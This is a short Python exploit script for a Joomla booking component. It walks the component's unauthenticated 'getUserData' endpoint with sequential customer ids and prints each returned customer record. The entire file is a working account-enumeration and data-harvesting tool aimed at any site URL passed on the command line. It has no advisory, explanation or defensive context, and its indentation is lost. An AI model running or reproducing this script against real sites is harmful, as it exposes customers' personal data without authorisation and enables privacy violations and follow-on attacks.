import argparse
import urllib.parse
import requests
from sys import exit
from time import sleep

def enumerateAccounts(options):
i = 1
url = options.url
url = url + "/index.php?option=com_booking&controller=customer&task=getUserData&id="

while True:
try:
response = requests.get("{}{}".format(url, str(i)))

if response.status_code == 200:
try:
jsondocument = response.json()
if jsondocument["name"] != None:
print(jsondocument)
except requests.exceptions.JSONDecodeError:
raise
else:
break
except Exception as ex:
print(ex)
break

i += 1

def main():
p = argparse.ArgumentParser()
p.add_argument("-u", "--url", type=str, required=True)
parsed = p.parse_args()

try:
t = urllib.parse.urlparse(parsed.url)
except ValueError as ex:
print(ex)
exit()

if not t[0].startswith("http") and not t[0].startswith("https"):
print("Improper URL given.")
exit()

if len(t[1]) == 0:
print("Improper URL given.")
exit()

enumerateAccounts(parsed)

if __name__ == "__main__":
main()
